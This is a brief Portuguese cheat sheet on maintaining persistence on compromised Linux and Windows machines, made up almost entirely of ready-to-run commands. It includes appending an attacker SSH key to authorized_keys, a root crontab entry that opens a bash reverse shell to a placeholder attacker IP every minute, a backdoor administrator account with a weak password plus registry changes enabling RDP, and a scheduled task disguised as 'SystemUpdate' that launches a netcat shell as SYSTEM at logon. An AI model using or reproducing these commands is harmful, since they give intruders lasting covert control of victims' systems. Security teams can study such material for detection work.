# 🔄 Persistência em Linux e Windows

---

## 1. Persistência em Sistemas Linux

### Injeção de Chave SSH
```bash
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... SEU_EMAIL" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Cronjob Malicioso
```bash
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'" >> /etc/crontab
```

---

## 2. Persistência em Sistemas Windows

### Criar Usuário Administrador de Backdoor
```cmd
net user suporte 12345 /add
net localgroup "Administradores" suporte /add
net localgroup "Remote Desktop Users" suporte /add

:: Habilitar RDP no Registro
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Tarefa Agendada (`Schtasks`)
```cmd
schtasks /create /tn "SystemUpdate" /tr "cmd.exe /c nc.exe SEU_IP 4444 -e cmd.exe" /sc ONLOGON /ru SYSTEM
```